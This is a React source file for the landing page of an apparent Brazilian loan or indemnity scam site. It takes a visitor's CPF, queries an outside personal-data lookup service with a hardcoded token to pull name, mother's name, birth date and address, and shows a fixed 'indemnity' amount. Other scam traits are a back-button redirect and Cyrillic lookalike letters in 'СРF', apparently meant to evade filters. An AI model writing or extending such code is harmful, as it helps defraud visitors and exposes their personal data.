import React, { useState, useEffect } from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import HeroSection from '../components/HeroSection';
import InfoSection from '../components/InfoSection';
import CPFForm from '../components/CPFForm';
import ResultDisplay from '../components/ResultDisplay';
import FAQSection from '../components/FAQSection';
import BackRedirect from '../components/BackRedirect';
import { useNavigate, useLocation } from 'react-router-dom';
import { useScrollAnimation } from '../hooks/useScrollAnimation';
import { navigateWithParams } from '../utils/urlParams';
import { trackViewContent } from '../utils/facebookPixel';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';

const HomePage: React.FC = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();
  const location = useLocation();
  const formAnimation = useScrollAnimation();
  const buttonAnimation = useScrollAnimation();

  useEffect(() => {
    trackViewContent({
      content_name: 'Home Page',
      content_category: 'Landing Page',
    });

    const funnelData = getFunnelData();
    if (funnelData.currentStep && funnelData.currentStep !== '/') {
      navigateWithParams(navigate, funnelData.currentStep, location);
    }
  }, []);

  const handleCPFSubmit = async (cpf: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      const response = await fetch(`https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=5y61eukw00cavxof9866lj`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const data = await response.json();
      console.log('API Response:', data); // Para debug
      console.log('Data fields:', Object.keys(data)); // Ver todos os campos disponíveis
      console.log('Birth date field:', data.dataNascimento || data.data_nascimento || data.nascimento || data.dt_nascimento); // Verificar campo de data

      // Verificar se a resposta contém dados válidos
      if (!data || data.error || !data.nome) {
        setError('CPF não encontrado. Por favor, verifique o número e tente novamente.');
        setIsLoading(false);
        return;
      }

      // Adaptar os dados conforme a estrutura da nova API
      const userData = {
        nome: data.nome || 'Nome não disponível',
        mae: data.mae || data.nomeMae || 'Não informado',
        cpf: cpf,
        dataNascimento: data.dataNascimento || data.data_nascimento || data.nascimento || data.dt_nascimento || '',
        email: data.email || `${cpf}@cliente.com`,
        telefone: data.telefone || data.celular || '11999999999',
        endereco: {
          cep: data.cep || '01000000',
          logradouro: data.logradouro || data.endereco || 'Rua Principal',
          numero: data.numero || '100',
          complemento: data.complemento || '',
          bairro: data.bairro || 'Centro',
          cidade: data.cidade || data.municipio || 'São Paulo',
          estado: data.estado || data.uf || 'SP'
        }
      };

      // Save complete user data in sessionStorage and localStorage
      sessionStorage.setItem('userData', JSON.stringify(userData));
      saveFunnelData({
        cpf: cpf,
        userData: userData,
        currentStep: '/resultado'
      });

      // Navigate with URL parameters preserved
      navigateWithParams(
        navigate,
        '/resultado',
        location,
        {
          userData: userData,
          indemnityAmount: 7854.63
        }
      );
    } catch (error) {
      console.error('Error fetching data:', error);
      setError('Ocorreu um erro ao consultar o CPF. Por favor, tente novamente.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-light-gray">
      <BackRedirect />
      <Header />
      
      <main>
        <HeroSection />
        
        <div id="consulta" className="relative py-20 px-6 md:px-12 min-h-screen flex items-center rounded-t-[20px] overflow-hidden z-10">
          <div
            className="absolute inset-0 -z-10"
            style={{
              backgroundImage: `linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('/dawdawd.webp')`,
              backgroundSize: 'cover',
              backgroundPosition: 'center',
            }}
          />
          
          <div className="relative max-w-7xl mx-auto w-full">
            <div className="text-center mb-12">
              <h2 className="text-3xl md:text-4xl font-semibold text-white mb-4">
                Consulte seu Empréstimo
              </h2>
              <p className="text-white max-w-2xl mx-auto [text-shadow:_1px_1px_2px_rgba(0,0,0,0.5)]">
                Informe seu СРF abaixo para verificar se você possui empréstimos disponíveis.
              </p>
            </div>

            <div
              ref={formAnimation.ref}
              className={`animate-on-scroll ${formAnimation.isVisible ? 'visible' : ''}`}
            >
              <CPFForm onSubmit={handleCPFSubmit} isLoading={isLoading} />
            </div>
            
            {error && (
              <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-4 text-center animate-fade-in">
                <p className="text-red-700">{error}</p>
              </div>
            )}
          </div>
        </div>

        <InfoSection />

        <FAQSection />

        <div
          ref={buttonAnimation.ref}
          className={`py-8 px-4 text-center animate-on-scroll ${buttonAnimation.isVisible ? 'visible' : ''}`}
        >
          <button
            onClick={() => {
              const consultaSection = document.getElementById('consulta');
              consultaSection?.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }}
            className="bg-purple-600 hover:bg-purple-700 text-white font-semibold py-4 px-8 rounded-lg text-lg transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl"
          >
            Consultar Agora
          </button>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default HomePage